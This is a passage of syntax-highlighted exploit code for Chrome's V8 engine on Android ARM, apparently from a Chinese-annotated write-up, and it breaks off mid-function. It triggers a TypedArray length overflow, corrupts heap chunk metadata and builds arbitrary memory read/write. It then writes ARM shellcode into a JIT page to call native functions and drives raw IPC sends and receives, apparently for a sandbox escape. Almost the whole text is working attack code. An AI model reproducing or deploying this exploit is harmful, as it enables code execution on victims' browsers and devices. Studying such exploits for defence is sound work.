</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;<span class="comment">//分配给a byteSize字节，并用B填充它。</span></span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Here's the actual v8 vulnerability in this complicated thing.</span></span><br><span class="line">    <span class="comment">// Runtime_TypedArrayInitializeFromArrayLike checks for the lack of</span></span><br><span class="line">    <span class="comment">// multiplicative overflow with 'length * element_size &lt; length'.</span></span><br><span class="line">    <span class="comment">// 0x24924925 is 2^32/7 + 1, the smallest number for which this check</span></span><br><span class="line">    <span class="comment">// passes, yet there was in fact overflow.</span></span><br><span class="line">    <span class="keyword">var</span> bad = (<span class="number">0x24925000</span> - <span class="number">8</span>) / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> hugetempl = &#123;</span><br><span class="line">      <span class="comment">//length: 0x4924924,</span></span><br><span class="line">      length: <span class="number">0x24924925</span>,</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      i: 76696062,</span></span><br><span class="line"><span class="comment">      get 76696062() &#123;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      i: <span class="number">0</span>,</span><br><span class="line">      get <span class="number">0</span>() &#123;</span><br><span class="line">        <span class="comment">//alert('creating pages');</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            createArray(<span class="number">0x20000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert('done');</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    hugetempl.__defineGetter__(bad, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prev: whatever</span></span><br><span class="line">        <span class="comment">// head: 0x20 | PINUSE_BIT(1) | CINUSE_BIT(2)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">7.611564664e-313</span>;<span class="comment">//deadbeef 00000023,覆盖chunk的meta data，将其size由0x20000改为0x20。</span></span><br><span class="line">        <span class="comment">//在free之后，就会插入0x20 byte free-list的头部</span></span><br><span class="line">    &#125;);<span class="comment">//一页的最后</span></span><br><span class="line">    <span class="keyword">var</span> foundIt = <span class="literal">false</span>;</span><br><span class="line">    hugetempl[bad + <span class="number">1</span>] = <span class="number">2261634.5098039214</span>; <span class="comment">// overwrites </span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在相邻的下一页开始的地方</span></span><br><span class="line"><span class="comment">    u2d</span></span><br><span class="line"><span class="comment">    sakura@sakuradeMacBook-Pro:~$ ./u2d 2261634.5098039214</span></span><br><span class="line"><span class="comment">    ########## mode2 ###########</span></span><br><span class="line"><span class="comment">    表示变换:(ull/ui -&gt; double/float)</span></span><br><span class="line"><span class="comment">    2261634.5098039214(2.261634509803921e+06 ) --d2ull-&gt; 0x4141414141414141</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    the beginning <span class="keyword">of</span> the array</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arraysI; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[j][<span class="number">0</span>] != <span class="number">0x42</span>) &#123;</span><br><span class="line">                <span class="comment">//alert('&lt;- ' + j + ': ' + arrays[j][0]);</span></span><br><span class="line">                replaceWithWTFArrayBuffer(arrays, j);</span><br><span class="line">                foundIt = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// m_sizeInBytes=2^31-1 m_deallocationObserver=null</span></span><br><span class="line">                <span class="comment">// can't go higher because it gets treated as signed</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.060997895e-314</span>;</span><br><span class="line">                <span class="comment">//0.0000000000(1.060997894988571e-314) --d2ull-&gt; 0x000000007fffffff</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        alert(<span class="string">'No good.  Crashing Chrome for another try...'</span>);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;);</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">3</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> huge = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(hugetempl);<span class="comment">//-&gt;触发</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(e == <span class="string">'ok'</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lowView = <span class="literal">null</span>, highView = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'return highView.'</span> + prop + <span class="string">'(a - 0x80000000, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'return lowView.'</span> + prop + <span class="string">'(a - 0x100, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'v'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'highView.'</span> + prop + <span class="string">'(a - 0x80000000, v, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'lowView.'</span> + prop + <span class="string">'(a - 0x100, v, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> read32 = rfunc(<span class="string">'getUint32'</span>);</span><br><span class="line"><span class="keyword">var</span> read8 = rfunc(<span class="string">'getUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write8 = wfunc(<span class="string">'setUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write32 = wfunc(<span class="string">'setUint32'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">start, step, words</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> first = words[<span class="number">0</span>], second = words[<span class="number">1</span>];</span><br><span class="line">    outer:</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = start; ; a += step) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read32(a) == first &amp;&amp; read32(a+<span class="number">4</span>) == second) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">2</span>; j &lt; words.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(a + j*<span class="number">4</span>) != words[j])</span><br><span class="line">                    <span class="keyword">continue</span> outer;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blxDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = read32(addr);</span><br><span class="line">    <span class="keyword">var</span> s = (val &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> i1 = <span class="number">1</span> - (((val &amp; <span class="number">0x20000000</span>) &gt;&gt; <span class="number">29</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i2 = <span class="number">1</span> - (((val &amp; <span class="number">0x8000000</span>) &gt;&gt; <span class="number">27</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i10h = val &amp; <span class="number">0x3ff</span>;</span><br><span class="line">    <span class="keyword">var</span> i10l = (val &amp; <span class="number">0x7fe0000</span>) &gt;&gt; <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">var</span> off = ((s * <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (i1 &lt;&lt; <span class="number">23</span>) | (i2 &lt;&lt; <span class="number">22</span>) | (i10h &lt;&lt; <span class="number">12</span>) | (i10l &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + <span class="number">4</span> * read8(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrAddPCDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr + <span class="number">2</span> + <span class="number">4</span> + read32(ldrDest(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copystr</span>(<span class="params">p, s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)</span><br><span class="line">        write8(p + i, s.charCodeAt(i));</span><br><span class="line">    write8(p + i, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEGONE = <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">func, a1, a2, a3, a4, a5, a6, a7, a8</span>) </span>&#123;</span><br><span class="line">    assert(func);</span><br><span class="line">    write32(callbuf + <span class="number">0x00</span>, a5);</span><br><span class="line">    write32(callbuf + <span class="number">0x04</span>, a6);</span><br><span class="line">    write32(callbuf + <span class="number">0x08</span>, a7);</span><br><span class="line">    write32(callbuf + <span class="number">0x0c</span>, a8);</span><br><span class="line">    write32(callbuf + <span class="number">0x10</span>, a1);</span><br><span class="line">    write32(callbuf + <span class="number">0x14</span>, a2);</span><br><span class="line">    write32(callbuf + <span class="number">0x18</span>, a3);</span><br><span class="line">    write32(callbuf + <span class="number">0x1c</span>, a4);</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, func);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span> read32(callbuf + <span class="number">0x24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareForCalls</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer, <span class="number">0</span>, buffer.byteLength);</span><br><span class="line">    <span class="keyword">if</span>(buffer.byteLength == <span class="number">0x7fffffff</span>) &#123;</span><br><span class="line">        lowView = dv;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highView = dv;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(lowView &amp;&amp; highView)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    alert(<span class="string">'+2'</span>);</span><br><span class="line">    <span class="keyword">var</span> text = read32(vtable + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> dlsymmer = find((text &amp; ~<span class="number">1</span>) + <span class="number">0x900000</span>, <span class="number">2</span>,</span><br><span class="line">        [<span class="number">0x46204798</span>, <span class="number">0xc0d6f59c</span>, <span class="number">0x4038e8bd</span>, <span class="number">0xb9ddf000</span>, <span class="number">0x0422bf00</span>]);</span><br><span class="line">    dlsym_addr = blxDest(dlsymmer - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This thing is probably the easiest way to be able to call functions with</span></span><br><span class="line">    <span class="comment">// arbitrarily many arguments.  It may turn out to be unnecessary if none</span></span><br><span class="line">    <span class="comment">// of the functions use that many arguments, but whatever...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tdter = find(dlsymmer, <span class="number">2</span>, [<span class="number">0x0058f645</span>, <span class="number">0x601a6016</span>]);</span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ptr = ldrAddPCDest(tdter - <span class="number">6</span>);</span><br><span class="line">    <span class="comment">//alert('tdter:' + asHex(tdter) + ' tdt:' + asHex(thread_data_table_));</span></span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ = read32(thread_data_table_ptr);</span><br><span class="line">    <span class="keyword">var</span> list_ = read32(thread_data_table_);</span><br><span class="line">    <span class="keyword">var</span> isolate_ = read32(list_);</span><br><span class="line">    <span class="keyword">var</span> heap_ = isolate_ + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> lo_space_ = read32(heap_ + <span class="number">0x598</span>); <span class="comment">/* ! */</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">'eval("");'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">40000</span>; i++) a += <span class="string">'a.a;'</span></span><br><span class="line">    a += <span class="string">'return 42;'</span>;</span><br><span class="line">    deadfunc = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, a);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">var</span> first_page_ = read32(lo_space_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="keyword">var</span> area_start_ = read32(first_page_ + <span class="number">0x10</span>), area_end_ = read32(first_page_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="comment">//alert('los=' + asHex(lo_space_) + ' code=' + asHex(code));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    00000000    e92d4030        push    &#123;r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000004    e59f5020        ldr     r5, [pc, #32]   ; 0x2c</span></span><br><span class="line"><span class="comment">    00000008    e8b5000f        ldm     r5!, &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    0000000c    e92d000f        push    &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    00000010    e8b5001f        ldm     r5!, &#123;r0, r1, r2, r3, r4&#125;</span></span><br><span class="line"><span class="comment">    00000014    e12fff34        blx     r4</span></span><br><span class="line"><span class="comment">    00000018    e5850000        str     r0, [r5]</span></span><br><span class="line"><span class="comment">    0000001c    e8bd403f        pop     &#123;r0, r1, r2, r3, r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000020    e3a00000        mov     r0, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000024    e3a01000        mov     r1, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000028    e12fff1e        bx      lr</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> insts = [<span class="number">0xe92d4030</span>,<span class="number">0xe59f5020</span>,<span class="number">0xe8b5000f</span>,<span class="number">0xe92d000f</span>,<span class="number">0xe8b5001f</span>,<span class="number">0xe12fff34</span>,<span class="number">0xe5850000</span>,<span class="number">0xe8bd403f</span>,<span class="number">0xe3a00000</span>,<span class="number">0xe3a01000</span>,<span class="number">0xe12fff1e</span>, callbuf];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = area_start_; a &lt; area_end_; a += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((read32(a) &amp; <span class="number">0xffff0000</span>) == (<span class="number">0xe92d0000</span> | <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(a + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            <span class="keyword">var</span> end = a + insts.length * <span class="number">4</span>;</span><br><span class="line">            insts[insts.length - <span class="number">1</span>] = callbuf + <span class="number">0x28</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(end + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            bxlr = end - <span class="number">8</span>;</span><br><span class="line">            stub2 = end;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a == area_end_) &#123;</span><br><span class="line">        alert(<span class="string">"didn't find push area="</span> + first_page_);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, bxlr);</span><br><span class="line">    <span class="keyword">while</span>(deadfunc(&#123;&#125;) == <span class="number">42</span>);</span><br><span class="line">    <span class="comment">//alert('OK');</span></span><br><span class="line">    theFunPart();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x) &#123;</span><br><span class="line">        <span class="keyword">var</span> errno = read32(call(funcs.__errno));</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed; errno = '</span> + errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xerr = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xassert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x &amp;&amp; !xerr) &#123;</span><br><span class="line">        xerr = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MInt</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        w: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            write32(buf.addr, x);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            buf[x] = read32(buf.addr);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MFileDesc</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = read32(buf.addr);</span><br><span class="line">            <span class="keyword">var</span> idx = read32(buf.addr + <span class="number">4</span>);</span><br><span class="line">            buf.addr += <span class="number">8</span>;</span><br><span class="line">            assert(valid);</span><br><span class="line">            assert(idx &lt; buf.fds.length);</span><br><span class="line">            buf[x] = buf.fds[idx];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageSend</span>(<span class="params">routing, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = &#123;<span class="attr">addr</span>: base + <span class="number">4</span>&#125;;</span><br><span class="line">    MInt(routing).w(buf);</span><br><span class="line">    MInt(type).w(buf);</span><br><span class="line">    <span class="keyword">var</span> flags = <span class="number">0x80000002</span>, num_fds = <span class="number">0</span>;</span><br><span class="line">    MInt(flags).w(buf);</span><br><span class="line">    MInt(num_fds).w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_start = buf.addr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_size = buf.addr - payload_start;</span><br><span class="line">    write32(base, payload_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    assert(call(funcs.send, pipe_, base, buf.addr - base, <span class="number">0</span>) == buf.addr - base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = <span class="string">''</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceive</span>(<span class="params">types</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">        <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">        call(funcs.memset, base, <span class="number">0xee</span>, <span class="number">0x200</span>);</span><br><span class="line">        <span class="keyword">var</span> len = call(funcs.recv, pipe_, base, <span class="number">4</span>, <span class="number">0</span>) | <span class="number">0</span>;</span><br><span class="line">        assert(len == <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> msg = &#123;<span class="attr">base</span>: base, <span class="attr">addr</span>: base&#125;;</span><br><span class="line">        MInt(<span class="string">'payload_size'</span>).r(msg);</span><br><span class="line">        <span class="keyword">var</span> len = msg.payload_size + <span class="number">0x10</span>;</span><br><span class="line">        assert(len &lt; <span class="number">0x1fc</span>);</span><br><span class="line">        assert(call(funcs.recv, pipe_, msg.addr, len, <span class="number">0</span>) == len);</span><br><span class="line">        readArgs(msg,</span><br><span class="line">            MInt(<span class="string">'routing'</span>),</span><br><span class="line">            MInt(<span class="string">'type'</span>),</span><br><span class="line">            MInt(<span class="string">'flags'</span>),</span><br><span class="line">            MInt(<span class="string">'num_fds'</span>));</span><br><span class="line">        <span class="keyword">if</span>(msg.num_fds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            msg.fds = [];</span><br><span class="line">            <span class="keyword">var</span> msghdr = scratch + <span class="number">0xc00</span>;</span><br><span class="line">            <span class="keyword">var</span> iov = scratch + <span class="number">0xc20</span>;</span><br><span class="line">            <span class="keyword">var</span> control = scratch + <span class="number">0xc40</span>;</span><br><span class="line">            write32(msghdr + <span class="number">0x00</span>, <span class="number">0</span>); <span class="comment">// msg_name</span></span><br><span class="line">            write32(msghdr + <span class="number">0x04</span>, <span class="number">0</span>); <span class="comment">// msg_namelen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x08</span>, iov); <span class="comment">// msg_iov</span></span><br><span class="line">            write32(msghdr + <span class="number">0x0c</span>, <span class="number">1</span>); <span class="comment">// msg_iovlen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x10</span>, control); <span class="comment">// msg_control</span></span><br><span class="line">            write32(msghdr + <span class="number">0x14</span>, <span class="number">0x100</span>); <span class="comment">// msg_controllen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x18</span>, <span class="number">0</span>); <span class="comment">// msg_flags</span></span><br><span class="line">            write32(iov + <span class="number">0</span>, scratch + <span class="number">0xc28</span>); <span class="comment">// iov_base</span></span><br><span class="line">            write32(iov + <span class="number">4</span>, <span class="number">1</span>); <span class="comment">// iov_len</span></span><br><span class="line">            assert(call(funcs.recvmsg, fd_pipe_, msghdr, <span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> controllen = read32(msghdr + <span class="number">0x14</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> cmsg = control; cmsg &lt; control + controllen; cmsg += (cmsg_len + <span class="number">3</span>) &amp; ~<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> SCM_RIGHTS = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> cmsg_len = read32(cmsg);</span><br><span class="line">                <span class="keyword">var</span> cmsg_level = read32(cmsg+<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">var</span> cmsg_type = read32(cmsg+<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmsg_level == SOL_SOCKET &amp;&amp; cmsg_type == SCM_RIGHTS) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> o = <span class="number">0xc</span>; o &lt; cmsg_len; o += <span class="number">4</span>)</span><br><span class="line">                        msg.fds.push(read32(cmsg + o));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(msg.fds.length == msg.num_fds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(types.indexOf(msg.type) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(msg.type != <span class="number">0x00010520</span>)</span><br><span class="line">                log += <span class="string">'spurious '</span> + asHex(msg.type) + <span class="string">'\n'</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"didn't receive desired message(s)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readArgs</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].r(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceiveDone</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> end = msg.addr;</span><br><span class="line">    <span class="keyword">var</span> true_end = msg.base + <span class="number">20</span> + msg.payload_size;</span><br><span class="line">    <span class="keyword">if</span>(end != true_end)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'extra bytes: '</span> + (true_end - end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setNonblock</span>(<span class="params">fd, on</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> F_SETFL = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">var</span> O_NONBLOCK = <span class="number">00004000</span>;</span><br><span class="line">    assert(call(funcs.fcntl, fd, F_SETFL, on ? O_NONBLOCK : <span class="number">0</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">theFunPart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// A lot of this is relatively unnecessary guesswork</span></span><br><span class="line">    <span class="comment">// because I hate searching for symbols.</span></span><br><span class="line">    <span class="comment">// pause the main thread</span></span><br><span class="line">    <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> SO_TYPE = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> syms = [</span><br><span class="line">        <span class="string">'getsockopt'</span>,</span><br><span class="line">        <span class="string">'write'</span>,</span><br><span class="line">        <span class="string">'send'</span>,</span><br><span class="line">        <span class="string">'recv'</span>,</span><br><span class="line">        <span class="string">'recvmsg'</span>,</span><br><span class="line">        <span class="string">'close'</span>,</span><br><span 